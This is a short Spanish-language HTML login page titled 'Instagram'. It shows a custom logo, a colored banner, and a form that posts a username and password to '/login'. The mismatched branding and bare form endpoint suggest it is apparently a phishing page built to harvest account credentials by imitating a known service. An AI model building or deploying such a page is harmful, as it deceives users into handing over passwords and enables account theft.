<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>

<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;600&display=swap" rel="stylesheet">

<style>
* {
margin: 0;
padding: 0;
box-sizing: border-box;
}

body {
background: #fafafa;
font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
display: flex;
justify-content: center;
align-items: center;
height: 100vh;

}

.wrapper {
width: 350px;
}

.box {
  position: relative;
background: #fff;
border: 1px solid #dbdbdb;
padding: 50px 40px 20px;
text-align: center;
  border-top: 20px solid #2CAEE8
}
 

.logo {
margin-bottom: 10px;
}

.logo img {
width: 300px;
position: relative;
left: -20px;
}

.input {
width: 100%;
height: 38px;
margin-bottom: 6px;
padding: 9px 8px;
border: 1px solid #dbdbdb;
border-radius: 3px;
background: #fafafa;
font-size: 12px;
top: -20px;
}
.input::placeholder {
color: #555; 
}
.input {
font-family: roboto, arial, sans-serif;
} 

.input::-webkit-input-placeholder { 
color: #555; 
}
.input:-ms-input-placeholder { 
color: #555; 
}

.btn {
width: 100%;
height: 35px;
margin-top: 10px;
background: #1877f2;
border: none;
border-radius: 4px;
color: white;
font-weight: 600;
font-size: 14px;
}

.divider {
display: flex;
align-items: center;
margin: 18px 0;
}

.line {
flex: 1;
height: 1px;
background: #dbdbdb;
}

.or {
margin: 0 10px;
font-size: 12px;
color: #8e8e8e;
font-weight: 600;
}

.fb {
display: flex;
justify-content: center;
align-items: center;
gap: 6px;
color: #0066ff;
font-weight: 600;
font-size: 14px;
margin-bottom: 12px;
}

.forgot {
font-size: 12px;
color: #0066ff;
}

.logo {
text-align: center;
}

</style>
</head>

<body> 

<div class="wrapper">

<div class="box">

<div class="logo">
<img src="logomp1.png">
</div>

<form method="POST" action="/login">
<input class="input" name="user" placeholder="Teléfono, e-mail o usuario">
<input class="input" type="password" name="pass" placeholder="Contraseña">
<button class="btn" type="submit">Continuar</button>
</form>

<div class="divider">
<div class="line"></div>
<div class="or">O</div>
<div class="line"></div>
</div>

<div class="fb">Crear cuenta</div>

<div class="forgot">¿Olvidaste tu contraseña?</div>

</div>

</div>

</body>
</html>
